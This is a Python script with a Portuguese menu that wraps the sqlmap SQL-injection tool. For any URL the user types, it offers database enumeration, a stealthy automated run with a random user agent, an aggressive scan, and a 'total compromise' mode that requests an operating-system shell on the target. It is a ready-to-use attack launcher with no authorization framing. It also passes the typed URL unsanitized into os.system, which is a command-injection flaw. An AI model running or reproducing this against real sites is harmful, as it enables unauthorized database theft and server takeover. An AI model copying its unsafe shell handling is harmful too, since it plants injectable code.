#SQLPMAP

import os
from colorama import Fore, Style
import time
texto_vihtools = r"""
 ██▒   █▓ ██▓ ██░ ██ ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
▓██░   █▒▓██▒▓██░ ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒     ▒██    ▒ 
 ▓██  █▒░▒██▒▒██▀▀██░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░     ░ ▓██▄   
  ▒██ █░░░██░░▓█ ░██ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░       ▒   ██▒
   ▒▀█░  ░██░░▓█▒░██▓  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
   ░ ▐░  ░▓   ▒ ░░▒░▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
   ░ ░░   ▒ ░ ▒ ░▒░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
     ░░   ▒ ░ ░  ░░ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
      ░   ░   ░  ░  ░             ░ ░      ░ ░      ░  ░      ░  
"""
def sqlmap():
    os.system('clear')
    print(Fore.RED + texto_vihtools + Style.RESET_ALL)
    print(Fore.WHITE + "CATEGORIA: INJEÇÃO EM BANCO DE DADOS - SQLMAP" + Style.RESET_ALL)
    print(Fore.WHITE + "Recursos do SqlMap:" + Style.RESET_ALL)
    print(Fore.WHITE + "[1] Listar banco de dados de um alvo" + Style.RESET_ALL)
    print(Fore.WHITE + "[2] Piloto Automático e Furtivo" + Style.RESET_ALL)
    print(Fore.WHITE + "[3] Varredura Agressiva" + Style.RESET_ALL)
    print(Fore.WHITE + "[4] Comprometimento Total (RCE)" + Style.RESET_ALL)
    print(Fore.WHITE + "[5] Voltar" + Style.RESET_ALL)

    user_funcoes_sqlmap = input(Fore.RED + "Selecione um recurso pelo número correspondente: " + Style.RESET_ALL)

    def listar_banco_dados():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)
        user_url_alvo = input(Fore.RED + "Digite o url: " + Style.RESET_ALL)

        os.system(f'sqlmap -u "{user_url_alvo}" --dbs')

        user_menu_recursos_sqlmap = input(Fore.RED + "Deseja voltar para o menu de recursos do Sqlmap? (s/n): " + Style.RESET_ALL)
        if user_menu_recursos_sqlmap.lower() == "s":
            sqlmap()
        else:
            print(Fore.RED + "Voltando para o menu principal..." + Style.RESET_ALL)
            time.sleep(1)
            os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
            time.sleep(1)

    def piloto_automatico():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)
        user_url_alvo_agent = input(Fore.RED + "Digite o url: " + Style.RESET_ALL)

        os.system(f'sqlmap -u "{user_url_alvo_agent}" --batch --random-agent')

        user_menu_recursos_sqlmap = input(Fore.RED + "Deseja voltar para o menu de recursos do Sqlmap? (s/n): " + Style.RESET_ALL)
        if user_menu_recursos_sqlmap.lower() == "s":
            sqlmap()
        else:
            print(Fore.RED + "Voltando para o menu principal..." + Style.RESET_ALL)
            time.sleep(1)
            os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
            time.sleep(1)

    def varredura_agressiva():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)
        user_url_alvo_varredura = input(Fore.RED + "Digite o url: " + Style.RESET_ALL)

        os.system(f'sqlmap -u "{user_url_alvo_varredura}" --level=5 --risk=3')

        user_menu_recursos_sqlmap = input(Fore.RED + "Deseja voltar para o menu de recursos do Sqlmap? (s/n): " + Style.RESET_ALL)
        if user_menu_recursos_sqlmap.lower() == "s":
            sqlmap()
        else:
            print(Fore.RED + "Voltando para o menu principal..." + Style.RESET_ALL)
            time.sleep(1)
            os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
            time.sleep(1)


    def comprometimento_total():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)
        user_url_alvo_comprometimento = input(Fore.RED + "Digite o url: " + Style.RESET_ALL)

        os.system(f'sqlmap -u "{user_url_alvo_comprometimento}" --os-shell')

        user_menu_recursos_sqlmap = input(Fore.RED + "Deseja voltar para o menu de recursos do Sqlmap? (s/n): " + Style.RESET_ALL)
        if user_menu_recursos_sqlmap.lower() == "s":
            sqlmap()
        else:
            print(Fore.RED + "Voltando para o menu principal..." + Style.RESET_ALL)
            time.sleep(1)
            os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
            time.sleep(1)

    if user_funcoes_sqlmap.lower() == "1":
        listar_banco_dados()
    elif user_funcoes_sqlmap.lower() == "2":
        piloto_automatico()
    elif user_funcoes_sqlmap.lower() == "3":
        varredura_agressiva()
    elif user_funcoes_sqlmap.lower() == "4":
        comprometimento_total()
    elif user_funcoes_sqlmap.lower() == "5":
        os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
    else:
        sqlmap()




sqlmap()